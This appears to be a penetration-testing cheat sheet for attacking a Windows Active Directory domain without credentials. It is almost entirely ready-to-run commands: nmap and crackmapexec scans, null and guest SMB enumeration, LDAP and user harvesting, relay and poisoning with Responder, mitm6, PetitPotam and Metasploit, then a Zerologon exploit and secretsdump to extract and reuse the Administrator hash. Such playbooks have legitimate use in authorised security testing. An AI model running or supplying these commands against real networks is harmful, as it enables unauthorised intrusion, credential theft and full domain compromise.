# Methodology

## No Credentials

### Scan Network

```bash
# Enumerate SMB Hosts
cme smb $iprange
# Ping scan
nmap -sP -p $ip
# Quick Scan
nmap -PN -sV --top-ports 50 --open $ip
# Search SMB vulnerabilities
nmap -PN --script smb-vuln* -p139,445 $ip
# Classic Scan
nmap -PN -sC -sV $ip
# Full Scan
nmap -PN -sC -sV -p- $ip
# UDP Scan
nmap -sU -sC -sV $ip
```

### Find AD IP

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.//$domain/
```

### Zone Transfer

```bash
dig axfr $domain @$nameserver
```

### List guest access on SMB share

```bash
enum4linux -a -u "" -p "" $dcip && enum4linux -a -u "guest" -p "" $dcip
smbmap -u "" -p "" -P 445 -H $dcip && smbmap -u "guest" -p "" -P 445 -H $dcip
smbclient -U '%' -L //$dcip && smbclient -U 'guest%' -L //$dcip
# Enumerate NULL session
cme smb $dcip -u '' -p ''
# Enumerate anonymous access
cme smb $dcip -u 'a' -p ''
```

### Enumerate LDAP

```bash
nmap -n -sV --script "ldap* and not brute" -p 389 $dcip
ldapsearch -x -h $ip -s base
```

### Find user list

```bash
enum4linux -U $dcip | grep 'user:'
cme smb $dcip -u $user -p $password --users
```

### Relay/Poisoning

```bash
# Find SMB not signed
nmap -Pn -sS -T4 --open --script smb-security-mode -p445 $subnet/$mask
use exploit/windows/smb/smb_relay
cme smb $hosts --gen-relay-list relay.txt
# Relay / Poisoning
PetitPotam.py -d $domain $listenerip $ip
responder -i eth0
mitm6 -d $domain
```

### Zerologon

```bash
python3 cve-2020-1472-exploit.py $machinebiosname $ip
secretsdump.py $domain/$machinebiosname\$@$ip -no-pass -just-dc-user "Administrator"
secretsdump.py -hashes :$HASH $domain/Administrator@$ip
```
